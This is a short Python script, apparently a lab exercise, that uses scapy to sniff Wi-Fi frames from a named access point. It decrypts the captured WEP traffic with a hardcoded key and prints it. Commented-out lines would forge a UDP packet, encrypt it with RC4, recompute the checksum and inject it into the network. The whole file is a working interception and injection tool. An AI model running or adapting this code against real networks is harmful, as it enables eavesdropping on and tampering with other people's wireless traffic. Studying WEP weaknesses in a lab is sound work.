from pyDot11.lib import *
from scapy.all import *
import binascii
import sys
import zlib

AP_PWD = '83EA4C12EA'
AP_NAME = b'Cisco33141'

info = []
packets = []

def beacon_targetting(pkt):
    global info
    if Dot11Beacon in pkt:
        if pkt.info == AP_NAME:
            info = [pkt.info, pkt.addr1, pkt.addr2, pkt.addr3]

def target_listening(pkt):
    global info
    if Dot11Beacon not in pkt and pkt.addr1 != 'ff:ff:ff:ff:ff:ff' and (pkt.addr1 == info[1] or pkt.addr2 == info[1] or pkt.addr3 == info[1]):
        if pkt.type == 2 and Dot11WEP in pkt:
                packets.append(pkt)

def seedGen(iv, keyText):
    keyLen = len(keyText)

    if keyLen == 5:
        key = binascii.unhexlify(hexstr(keyText, onlyhex = 1).replace(' ', ''))
    elif keyLen == 10:
        key = binascii.unhexlify(keyText)

    elif keyLen == 13:
        key = binascii.unhexlify(hexstr(keyText, onlyhex = 1).replace(' ', ''))
    elif keyLen == 26:
        key = binascii.unhexlify(keyText)

    return iv + key


sniff(count=int(sys.argv[1]), iface="wlan0mon", prn=beacon_targetting)

if info[1] == 'ff:ff:ff:ff:ff:ff':
    del info[1]
if info[1] == info[2]:
    del info[2]

sniff(count=int(sys.argv[2]), iface="wlan0mon", prn=target_listening)
msg = b'Bonjour'

for pkt in packets:
    seed = seedGen(pkt[Dot11WEP].iv, AP_PWD)

    decyphered = wepDecrypt(pkt, keyText=AP_PWD)
    print(decyphered)

    # sendp(pkt, iface='wlan0mon')
    print('-------------------------------')
    # stack = LLC()/IP(src='192.168.1.1', dst='192.168.1.129')/UDP(sport=44444, dport=37020, len=len(msg))/msg
    # cyphered = rc4(bytes(stack), seed)
    # pkt[Dot11WEP].wepdata = cyphered
    # pkt[Dot11WEP].icv = zlib.crc32(bytes(stack))
    # pkt.addr1 = pkt.addr2
    # pkt.addr2 = pkt.addr3
    # sendp(pkt, iface='wlan0mon')


